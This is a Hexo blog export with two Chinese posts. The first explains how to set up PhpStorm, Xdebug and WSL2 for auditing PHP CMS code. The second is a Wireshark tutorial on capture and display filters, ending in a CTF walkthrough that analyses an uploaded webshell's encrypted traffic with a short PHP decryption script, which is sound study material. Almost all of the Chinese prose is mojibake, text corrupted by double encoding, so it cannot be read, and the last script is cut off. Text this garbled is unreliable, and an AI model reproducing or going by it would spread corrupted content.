    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>â€‹        æ¥ä¸‹æ¥æƒ³å®¡è®¡å‡ ä¸ªå¼€æºçš„cmsï¼Œå·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯phpstrom+xdebug+phpstudyçš„ç»„åˆã€‚å®‰è£…phpstromå’Œphpstudyè¿™ä¸ªä¸å¤šè¯´ã€‚</p><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>â€‹        æ³¨æ„è¿™é‡Œä¸è¦ä½¿ç”¨apacheä½œä¸ºä¸­é—´ä»¶ï¼Œè¿™æ ·ä¼šå¯¼è‡´è°ƒè¯•è¿‡ç¨‹ä¸­ä¼šè¯ä¸¢å¤±(å¤§æ¦‚1åˆ†é’Ÿä¸åˆ°)ã€‚</p><a id="more"></a>

<p>åæ¥å‘ç°å…¶å®æ˜¯phpstudyçš„apacheé»˜è®¤é…ç½®é—®é¢˜ï¼Œä¿®æ”¹ä¸€ä¸‹å°±è¡Œ</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210727084808790.png" alt="image-20210727084808790"></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;IfModule</span> <span class="string">mod_fcgid.c&gt;</span></span><br><span class="line"><span class="comment">	# php-cgiè¿›ç¨‹çš„ç”Ÿå­˜æ—¶é—´</span></span><br><span class="line">true<span class="attr">FcgidProcessLifeTime</span> <span class="string">9999</span></span><br><span class="line"><span class="comment">	# php-cgiè¿›ç¨‹IOè¶…æ—¶æ—¶é—´</span></span><br><span class="line">    <span class="attr">FcgidIOTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment">	# php-cgiè¿›ç¨‹è¿æ¥è¶…æ—¶æ—¶é—´</span></span><br><span class="line">    <span class="attr">FcgidConnectTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment">	# ä¸Šä¼ æ–‡ä»¶çš„æœ€å¤§å°ºå¯¸ 100MB</span></span><br><span class="line">true<span class="attr">FcgidMaxRequestLen</span> <span class="string">104857600</span></span><br><span class="line"><span class="comment">	# php-cgiæœ€å¤§çš„è¿›ç¨‹æ•°</span></span><br><span class="line"><span class="comment">	# FcgidMaxProcesses 5</span></span><br><span class="line"><span class="attr">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…ˆå¯åŠ¨nginxå’Œmysql</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119185312944.png" alt="image-20210119185312944"></p>
<p>å†æ–°å»ºç½‘ç«™</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119190147445.png" alt="image-20210119190147445"></p>
<p>è¿™ä¸ªé»˜è®¤é…ç½®å°±è¡Œï¼Œæ³¨æ„ä½¿ç”¨<strong>cmsæ¨èçš„phpç‰ˆæœ¬</strong>ã€‚</p>
<p>æ‰“å¼€ç½‘ç«™èƒ½æ­£å¸¸è®¿é—®å°±è¡Œã€‚</p>
<p>åŒæ—¶åœ¨ ç®¡ç†-&gt;phpæ‰©å±•-&gt; å‹¾é€‰xdebug</p>
<p>æ‰“å¼€å¯¹åº”ç‰ˆæœ¬çš„php.iniæ–‡ä»¶</p>
<p>åœ¨<code>[xdebug]</code>é¡¹æ·»åŠ idekeyå’Œæ‰“å¼€è¿œç¨‹è°ƒè¯•</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210121121958881.png" alt="image-20210121121958881"></p>
<h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>â€‹        å°†ç½‘ç«™æ ¹ç›®å½•ä½œä¸ºé¡¹ç›®æ‰“å¼€</p>
<p>æ‰“å¼€è®¾ç½®é€‰æ‹©phpç‰ˆæœ¬</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119191031796.png" alt="image-20210119191031796"></p>
<p>ä¸‹æ‹‰phpåˆ—è¡¨</p>
<p>é…ç½®æœåŠ¡å™¨å’Œphpstudyç›¸åŒå°±è¡Œ</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119191134264.png" alt="image-20210119191134264"></p>
<p>ä¸‹æ‹‰è°ƒè¯•</p>
<p>é€‰æ‹©DBGpä»£ç†</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119191229837.png" alt="image-20210119191229837"></p>
<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯è¿™ä¸‰ä¸ªå€¼è¦å’Œphp.iniä¸­çš„å¯¹åº”</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM </span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost </span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br></pre></td></tr></table></figure>

<p>åœ¨phpstorm å³ä¸Šè§’æ·»åŠ é…ç½®</p>
<p>é€‰æ‹©php webé¡µé¢</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119191734997.png" alt="image-20210119191734997"></p>
<p>ç‚¹å‡» éªŒè¯æµ‹è¯•xdebugæ²¡é—®é¢˜</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119191827554.png" alt="image-20210119191827554"></p>
<h3 id="æµè§ˆå™¨å®‰è£…Xdebug-helper"><a href="#æµè§ˆå™¨å®‰è£…Xdebug-helper" class="headerlink" title="æµè§ˆå™¨å®‰è£…Xdebug helper"></a>æµè§ˆå™¨å®‰è£…Xdebug helper</h3><p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119192132260.png" alt="image-20210119192132260"></p>
<p>åœ¨æ‰©å±•é€‰é¡¹ä¸­å¡«å†™IDE key</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119192225930.png" alt="image-20210119192225930"></p>
<h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>å…ˆä¸‹å¥½æ–­ç‚¹</p>
<p>ç„¶åç‚¹å‡»ç›‘å¬</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119192018629.png" alt="image-20210119192018629"></p>
<p>Shift+F10 è¿è¡Œ</p>
<p>æ¥ç€åœ¨æµè§ˆå™¨å°†Xdebug helperé€‰æ‹©debugæ¨¡å¼</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119192710255.png" alt="image-20210119192710255"></p>
<p>å†å»è§¦å‘ç›¸åº”çš„ä»£ç ï¼Œå°±èƒ½åœ¨æ–­ç‚¹å¤„åœä¸‹äº†</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119193010239.png" alt="image-20210119193010239"></p>
<p>æ¥ä¸‹æ¥å¯ä»¥æ„‰å¿«çš„è°ƒè¯•äº†ï¼</p>
<p>å¯¹äºè¿è¡Œåœ¨5.4åŠå…¶ä»¥ä¸Šçš„cmsï¼Œè°ƒè¯•æ—¶å¯ä»¥ä¸ä½¿ç”¨phpstudy(éœ€è¦xdebugæ’ä»¶),åœ¨å³ä¸Šè§’æ·»åŠ é…ç½®æ—¶é€‰æ‹©phpå†…ç½®æœåŠ¡å™¨å³å¯</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119194552083.png" alt="image-20210119194552083"></p>
<p>è¿™é‡Œæ˜¯è‡ªå·±èµ·äº†phpç›‘å¬ï¼Œå¯ä»¥çœ‹åˆ°è®¿é—®çš„è¯·æ±‚ï¼Œä¸¤ç§è¿è¡Œæ–¹æ³•å„æœ‰ä¼˜åŠ£ã€‚</p>
<p>åé¢åˆå‘ç°ä¸ªé—®é¢˜</p>
<p>è°ƒè¯•æ—¶ä¼šé‡åˆ°debugä¼šè¯æœªæš‚åœçš„è­¦å‘Š</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210119194221935.png" alt="image-20210119194221935"></p>
<p>è°ƒè¯•çš„ç½‘é¡µä¹Ÿä¼šæŠ¥ä¸€ä¸ª404é”™è¯¯ï¼Œä¼šå½±å“åç»­çš„è°ƒè¯•ã€‚</p>
<p>å„ç§åˆ‡æ¢ç‰ˆæœ¬ï¼Œä¿®æ”¹é…ç½®ï¼Œæœç´¢å¼•æ“ç­‰æ“ä½œï¼Œè¿˜æ˜¯æ‰¾ä¸åˆ°è§£å†³åŠæ³•ã€‚(æ•‘æ•‘å­©å­</p>
<p>æ‰€ä»¥æ‰“ç®—å¼ƒäº†phpstudyï¼Œæ”¹ç”¨wsl2ä½œä¸ºè°ƒè¯•ç¯å¢ƒ(æˆ‘å¤ªéš¾äº†)</p>
<p>åé¢å‘ç°ï¼Œåˆ«å·æ‡’ç›´æ¥è®¾ç½®åœ¨è„šæœ¬ç¬¬ä¸€è¡Œè°ƒè¯•å³å¯</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210727085451391.png" alt="image-20210727085451391"></p>
<h3 id="WSL2ç®¡ç†å¤šç‰ˆæœ¬php"><a href="#WSL2ç®¡ç†å¤šç‰ˆæœ¬php" class="headerlink" title="WSL2ç®¡ç†å¤šç‰ˆæœ¬php"></a>WSL2ç®¡ç†å¤šç‰ˆæœ¬php</h3><p>ä½œä¸ºä¸€ä¸ªè°ƒè¯•ç¯å¢ƒï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªphpç‰ˆæœ¬æ— ç–‘æ˜¯å¤±è´¥çš„ï¼</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //æ·»åŠ ä»“åº“æº</span><br><span class="line">sudo apt-get update						  //æ›´æ–°æº</span><br><span class="line">sudo apt-get install php5.6				  //å®‰è£…å…¶ä»–ç‰ˆæœ¬php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //å®‰è£…å¿…é¡»çš„æ’ä»¶</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure>

<p>æ›´å¤šå†…å®¹å‚è€ƒè¿™ç¯‡<a href="https://justcode.ikeepstudying.com/2018/11/%E5%AE%89%E8%A3%85%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84php-php%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85-how-to-install-different-php-5-6-7-0-and-7-1-versions-in-ubuntu/" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>å¦‚æœæ˜¯kaliç­‰debianç³»å¯ä»¥å‚è€ƒä¸€ä¸‹å‘½ä»¤</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®æ”¹php-iniæ–‡ä»¶"><a href="#ä¿®æ”¹php-iniæ–‡ä»¶" class="headerlink" title="ä¿®æ”¹php.iniæ–‡ä»¶"></a>ä¿®æ”¹php.iniæ–‡ä»¶</h3><p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123221353899.png" alt="image-20210123221353899"></p>
<p>æ·»åŠ  [xdebug]</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123224346250.png" alt="image-20210123224346250">ï¼Œ</p>
<p>è¿™é‡Œè¦æ³¨æ„</p>
<p><strong>1.remote_hostè¦å¡«win10çš„wslçš„ipï¼Œwslä¸èƒ½ç›´æ¥é€šè¿‡localhostè®¿é—®win10çš„ç«¯å£</strong></p>
<p><strong>2.åœ¨win10é˜²ç«å¢™çš„å‡ºç«™è§„åˆ™ä¸­æŠŠå…¬ç”¨åŸŸçš„ä¸¤ä¸ªé…ç½®æ”¹æˆå…è®¸è¿æ¥</strong></p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123232107298.png" alt="image-20210123232107298"></p>
<p>å¤ªè‰äº†ï¼Œä¸æ˜¯è¿™ä¸ªxdebug.logä¸€è¾ˆå­ç¿»ä¸äº†æ¡ˆ</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123222005027.png" alt="image-20210123222005027"></p>
<h3 id="PHPSTORMæ·»åŠ è¿è¡Œç¯å¢ƒ"><a href="#PHPSTORMæ·»åŠ è¿è¡Œç¯å¢ƒ" class="headerlink" title="PHPSTORMæ·»åŠ è¿è¡Œç¯å¢ƒ"></a>PHPSTORMæ·»åŠ è¿è¡Œç¯å¢ƒ</h3><p>è¿™é‡Œçš„é…ç½®å’Œä¸Šé¢ä¸€æ ·ï¼Œæˆ‘å°±è´´ä¸ªå›¾æŠŠ</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123222129044.png" alt="image-20210123222129044"></p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123222154726.png" alt="image-20210123222154726"></p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123222219179.png" alt="image-20210123222219179"></p>
<p>è¿è¡Œ ç›‘å¬ æµè§ˆå™¨å¼€å¯xdebug</p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123222337715.png" alt="image-20210123222337715"></p>
<p><img src="/2021/01/phpstrom-xdebugè°ƒè¯•ä»£ç /image-20210123222355580.png" alt="image-20210123222355580"></p>
<p>å¿ƒç´¯- -ï¼</p>
<p>è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯æ¯æ¬¡é‡å¯åwin10çš„wslç½‘åŸŸä¼šå˜åŒ–ï¼Œæ‰€ä»¥xdebugçš„é…ç½®ä¹Ÿè¦è·Ÿç€å˜åŒ–</p>
<p>è¿™é‡Œå¯ä»¥è€ƒè™‘æŠŠwslè®¾ç½®ä¸ºé™æ€IPï¼Œä½†æˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯å†™ä¸ªè„šæœ¬ä¿®æ”¹xdebugçš„é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=$(cat /etc/resolv.conf | grep nameserver |awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line"><span class="comment">#echo $ip</span></span><br><span class="line">sudo sed -i  <span class="string">"/^xdebug.remote_host/cxdebug.remote_host=<span class="variable">$ip</span>"</span> /etc/php/5.6/cli/php.ini</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯åœ¨php.ini</p>
<p>æ·»åŠ  <code>xdebug.remote_connect_back = 1</code> //å¦‚æœå¼€å¯ï¼Œå°†å¿½ç•¥ xdebug.remote_host çš„å‚æ•°ã€‚å®ƒä¼šæ ¹æ®è®¿é—®çš„ipç›´æ¥å›è¿</p>
]]></content>
      <categories>
        <category>ç¯å¢ƒæ­å»º</category>
      </categories>
      <tags>
        <tag>è°ƒè¯•</tag>
        <tag>phpstorm</tag>
      </tags>
  </entry>
  <entry>
    <title>wireshark</title>
    <url>/2019/11/wireshark/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ä¸€ã€å¿«æ·é”®"><a href="#ä¸€ã€å¿«æ·é”®" class="headerlink" title="ä¸€ã€å¿«æ·é”®"></a>ä¸€ã€å¿«æ·é”®</h2><p>Ctrl+M æ ‡è®°/å–æ¶ˆæ ‡è®°<br> shift+ctrl+N/B ä¸‹/ä¸Šä¸€ä¸ªè¢«æ ‡è®°çš„æ•°æ®åŒ…</p><h2 id="äºŒã€è¿‡æ»¤å™¨è¯­æ³•"><a href="#äºŒã€è¿‡æ»¤å™¨è¯­æ³•" class="headerlink" title="äºŒã€è¿‡æ»¤å™¨è¯­æ³•"></a>äºŒã€è¿‡æ»¤å™¨è¯­æ³•</h2><h3 id="1-æ•è·è¿‡æ»¤å™¨çš„BPF-Berkeley-Packet-Filter-è¯­æ³•"><a href="#1-æ•è·è¿‡æ»¤å™¨çš„BPF-Berkeley-Packet-Filter-è¯­æ³•" class="headerlink" title="1.æ•è·è¿‡æ»¤å™¨çš„BPF(Berkeley Packet Filter)è¯­æ³•"></a>1.æ•è·è¿‡æ»¤å™¨çš„BPF(Berkeley Packet Filter)è¯­æ³•</h3><p>é™å®šè¯    è¯´æ˜                                                                  ä¾‹å­  </p><a id="more"></a>

<p>Type      æŒ‡å‡ºåå­—æˆ–æ•°å­—æ‰€ä»£è¡¨çš„æ„ä¹‰                         hostã€netã€port  </p>
<p>Dir         æŒ‡æ˜ä¼ è¾“æ–¹å‘æ˜¯å‰å¾€è¿˜æ˜¯æ¥è‡ªåå­—æˆ–æ•°å­—      srcã€dst  </p>
<p>Proto     é™å®šæ‰€è¦åŒ¹é…çš„åè®®                                        etherã€ipã€tcpã€udpã€httpã€ftp</p>
<p>ä½¿ç”¨BPFè¯­æ³•åˆ›å»ºçš„è¿‡æ»¤å™¨è¢«ç§°ä¸ºè¡¨è¾¾å¼ï¼Œæ¯ä¸ªè¡¨è¾¾å¼åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŸè¯­ã€‚æ¯ä¸ªåŸè¯­åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªé™å®šè¯ï¼Œç„¶åè·Ÿç€ä¸€ä¸ªIDåå­—æˆ–è€…æ•°å­—</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">&lt;----------åŸè¯­---------&gt;</span>|<span class="string">&lt;æ“ä½œç¬¦&gt;</span>|<span class="string">&lt;-----åŸè¯­----&gt;</span>|</span><br><span class="line"> dst   host   192.168.0.10   &amp;&amp;    tcp   port   80</span><br><span class="line">|<span class="string">é™å®šè¯</span>|<span class="string">é™å®šè¯</span>|<span class="string">&lt;----ID----&gt;</span>|<span class="string">      </span>|<span class="string">é™å®šè¯</span>|<span class="string">é™å®šè¯</span>|<span class="string">ID</span>|</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨3ä¸­é€»è¾‘è¿ç®—ç¬¦å¯¹åŸè¯­è¿›è¡Œç»„åˆ</p>
<ul>
<li>è¿æ¥è¿ç®—ç¬¦ &amp;&amp;</li>
<li>é€‰æ‹©è¿ç®—ç¬¦ ||</li>
<li>å¦å®šè¿ç®—ç¬¦ !</li>
</ul>
<p>ä¾‹ï¼š<br> <code>src 192.168.0.10 &amp;&amp; port 80</code><br> åªæ•è·æºåœ°å€æ˜¯192.168.0.10å’Œæºç«¯å£æˆ–ç›®çš„ç«¯å£æ˜¯80çš„æµé‡</p>
<p><code>ether host 00-1a-a0-52-e2-a0</code><br> æ ¹æ®MACåœ°å€æ•è·</p>
<h4 id="å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹"><a href="#å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹" class="headerlink" title="å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹"></a>å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹</h4><p> è¿‡æ»¤å™¨                                      è¯´æ˜                        </p>
<p> tcp[13]&amp;32==32                                          è®¾ç½®URGä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;16==16                                          è®¾ç½®ACKä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;8==8                                              è®¾ç½®PSHä½çš„TCPæ•°æ®åŒ…<br>  tcp[13]&amp;4==4                                            è®¾ç½®RSTä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;2==2                                              è®¾ç½®SYNä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;1==1                                            è®¾ç½®FINä½çš„TCPæ•°æ®åŒ…<br> tcp[13]==18                                                 TCP SYN-ACKæ•°æ®åŒ…<br> ether host 00:00:00:00:00:00(ä½ çš„MACåœ°å€)       æµå…¥æˆ–æµå‡ºä½ MACåœ°å€çš„æµé‡<br> !ether host 00:00:00:00:00:00(ä½ çš„MACåœ°å€)     ä¸æµå…¥æˆ–æµå‡ºä½ MACåœ°å€çš„æµé‡<br> broadcast                                                    ä»…å¹¿æ’­æµé‡<br> icmp                                                           ICMPæµé‡<br> icmp[0:2]==0x0301                               ICMPç›®æ ‡ä¸å¯è¾¾ã€ä¸»æœºä¸å¯è¾¾<br> ip                                                                     ä»…IPv4æµé‡<br> ip6                                                               ä»…IPv6æµé‡<br> udp                                                         ä»…UDPæµé‡                   </p>
<h3 id="2-åè®®åŸŸè¿‡æ»¤å™¨"><a href="#2-åè®®åŸŸè¿‡æ»¤å™¨" class="headerlink" title="2.åè®®åŸŸè¿‡æ»¤å™¨"></a>2.åè®®åŸŸè¿‡æ»¤å™¨</h3><p>BPFè¯­æ³•è¿˜æä¾›äº†åè®®åŸŸè¿‡æ»¤å™¨ï¼Œå¯ä»¥åšæŒåè®®å¤´ä¸­çš„æ¯ä¸€å­—èŠ‚æ¥è¿‡æ»¤<br> ä¾‹ï¼š<br> <code>icmp[0]==3</code><br> è¿”å›icmpåŒ…çš„ç¬¬1ä¸ªå­—èŠ‚çš„æ•´å½¢å€¼æ¯”è¾ƒï¼Œåªæ•è·ä»£è¡¨ç›®æ ‡ä¸å¯è¾¾ä¿¡æ¯(ç±»å‹3)çš„ICMPæ•°æ®åŒ…</p>
<p><code>icmp[0:2]==0x0301</code><br> æ•è·æ‰€æœ‰ç±»å‹3ä»£ç 1è¡¨ç¤ºçš„ç›®æ ‡ä¸å¯è¾¾ã€ä¸»æœºä¸å¯è¾¾çš„ICMPæ•°æ®åŒ…</p>
<p><code>tcp[13]&amp;4==4</code><br> åªæ•è·å¸¦æœ‰RSTæ ‡å¿—çš„TCPæ•°æ®åŒ…(RSTæ ‡å¿—ä½åœ¨TCPåŒ…åç§»13å­—èŠ‚ï¼Œ00000100)</p>
<h3 id="3-æ˜¾ç¤ºè¿‡æ»¤å™¨"><a href="#3-æ˜¾ç¤ºè¿‡æ»¤å™¨" class="headerlink" title="3.æ˜¾ç¤ºè¿‡æ»¤å™¨"></a>3.æ˜¾ç¤ºè¿‡æ»¤å™¨</h3><p><a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">æ˜¾ç¤ºè¿‡æ»¤å™¨å‚è€ƒ</a></p>
<p>å¸¸ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨</p>
<p>è¿‡æ»¤å™¨                                  è¯´æ˜<br>!tcp.port==3389                 æ’é™¤RDPæµé‡<br>tcp.flags.syn==1                å…·æœ‰SYNæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…<br>tcp.flags.rst==1                  å…·æœ‰RSTæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…<br>!arp                                      æ’é™¤ARPæµé‡<br>http                                æ‰€æœ‰HTTPæµé‡<br>tcp.port==23 || tcp.port==21  æ–‡æœ¬ç®¡ç†æµé‡ï¼ˆTelnetæˆ–FTPï¼‰<br>smtp || pop || imap         æ–‡æœ¬emailæµé‡ï¼ˆSMTPã€POPæˆ–IMAPï¼‰ </p>
<h2 id="ä¸‰ã€å¯¼å‡ºå¯¹è±¡"><a href="#ä¸‰ã€å¯¼å‡ºå¯¹è±¡" class="headerlink" title="ä¸‰ã€å¯¼å‡ºå¯¹è±¡"></a>ä¸‰ã€å¯¼å‡ºå¯¹è±¡</h2><p>CTFç«èµ›ä¸­æœ€å¸¸è§çš„å°±æ˜¯HTTPåè®®äº†ï¼Œè€Œä¸”é€šä¿¡ä¸»æœºå°‘å®¹æ˜“åˆ†æã€‚</p>
<p>åˆ©ç”¨å¯¼å‡ºå¯¹è±¡å¯ä»¥å¿«é€Ÿçš„åˆ¤æ–­è¿™æ®µæµé‡åœ¨å¹²å˜›ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191103145931434.png" alt="image-20191103145931434"></p>
<p>é€‰æ‹©HTTPâ€¦</p>
<p><img src="/2019/11/wireshark/image-20191103155828631.png" alt="image-20191103155828631"></p>
<p>å¾ˆæ¸…æ™°çš„å¯ä»¥çœ‹åˆ°httpè¯·æ±‚ã€‚</p>
<p>å¾ˆæ˜æ˜¾æ˜¯ä¸ªæ”»å‡»è€…å¯¹æœåŠ¡å™¨å‘èµ·äº†sqlæ³¨å…¥æ”»å‡»</p>
<p>æ ¹æ®å®ƒçš„HTTPè¯·æ±‚ï¼Œæ”»å‡»è€…è·å¾—äº†é‚£äº›æ•°æ®æˆ‘ä»¬åŒæ ·ä¹Ÿèƒ½å¾—åˆ°ã€‚</p>
<p>è€Œä¸”ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½èƒ½æˆªè·ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191103170050584.png" alt="image-20191103170050584"></p>
<p>é€šè¿‡å³ä¸‹è§’çš„SAVAå¯ä»¥å®Œæ•´çš„ä¿å­˜ä¼ è¾“çš„æ–‡ä»¶ã€‚</p>
<h2 id="å››ã€å®æˆ˜"><a href="#å››ã€å®æˆ˜" class="headerlink" title="å››ã€å®æˆ˜"></a>å››ã€å®æˆ˜</h2><p>æµé‡åˆ†æå°±æ˜¯ä¸ªå¤§æ‚çƒ©ï¼Œä»€ä¹ˆéƒ½èƒ½åŠ ã€‚</p>
<p>æ¯”å¦‚phpè¯­è¨€ï¼Œhttpï¼Œtcp/ipåè®®ï¼Œå„ç§åŠ è§£å¯†ï¼Œéšå†™ï¼Œsqlæ³¨å…¥ç­‰ç­‰</p>
<p>3CTFå¤èµ›çš„ä¸€é“æµé‡åˆ†æé¢˜</p>
<p><a href="https://pan.baidu.com/s/1rLlbRyapHrTOWUc3BfVafQ" target="_blank" rel="noopener">ok.pcapng</a> æå–ç : 7y3a </p>
<p>å…ˆä½¿ç”¨ ç»Ÿè®¡-åè®®åˆ†çº§åŠŸèƒ½ï¼ŒæŸ¥çœ‹æµé‡åŒ…å…·ä½“çš„æœ‰å“ªäº›åè®®ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191107184246441.png" alt="image-20191107184246441"></p>
<p>ç™¾åˆ†ä¹‹ä¹åä»¥ä¸Šæ˜¯TCPåè®®ã€‚</p>
<p>ç„¶åä½¿ç”¨ æ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-HTTP æŸ¥çœ‹å…·ä½“çš„HTTPè¯·æ±‚å’Œæ˜¯å¦æœ‰æ–‡ä»¶ä¼ è¾“</p>
<p><img src="/2019/11/wireshark/image-20191107184812717.png" alt="image-20191107184812717"></p>
<p>ä»è¿™äº›HTTPè¯·æ±‚ä¸­ï¼Œåº”è¯¥æ˜¯é€šè¿‡upload.phpä¸Šä¼ äº†file_5d81f9f4d22d41.67475082.php</p>
<p>ç„¶åä¸€ç›´ä¸file_5d81f9f4d22d41.67475082.phpè¿›è¡Œäº¤äº’ã€‚</p>
<p>åˆ©ç”¨ è¿½è¸ªæµçš„åŠŸèƒ½æŸ¥çœ‹å®Œæ•´çš„æŠ¥æ–‡</p>
<p><img src="/2019/11/wireshark/image-20191107221151317.png" alt="image-20191107221151317"></p>
<p>é€‰æ‹©HTTPæµ</p>
<p><img src="/2019/11/wireshark/image-20191107221334510.png" alt="image-20191107221334510"></p>
<p>ä¸€ä¸ªæ ‡å‡†çš„å†°èé©¬</p>
<p>å†°èé©¬ä¼šå…ˆä»å®¢æˆ·ç«¯å¾—åˆ°ä¸€ä¸ªåŠ å¯†å¯†åŒ™ï¼Œç”¨äºæµé‡åŠ å¯†ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191107222451205.png" alt="image-20191107222451205"></p>
<p>æˆ‘ä»¬è¿½è¸ªä¸€ä¸‹pass=790çš„æµé‡ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©è¿½è¸ªTCPæµï¼Œæ–¹ä¾¿åé¢æŸ¥çœ‹å…¶ä»–æµ</p>
<p><img src="/2019/11/wireshark/image-20191107223755881.png" alt="image-20191107223755881"></p>
<p>å¾—åˆ°è§£å¯†å¯†åŒ™  <code>d59042be6e437849</code></p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$post=<span class="string">''</span>; <span class="comment"># æ”¾å…¥ä½ è¦è§£å¯†çš„å†…å®¹</span></span><br><span class="line">$str=openssl_decrypt($post, <span class="string">"AES128"</span>, <span class="string">'d59042be6e437849'</span>);</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$str);</span><br><span class="line">fclose($file);</span><br><span class="line"><span 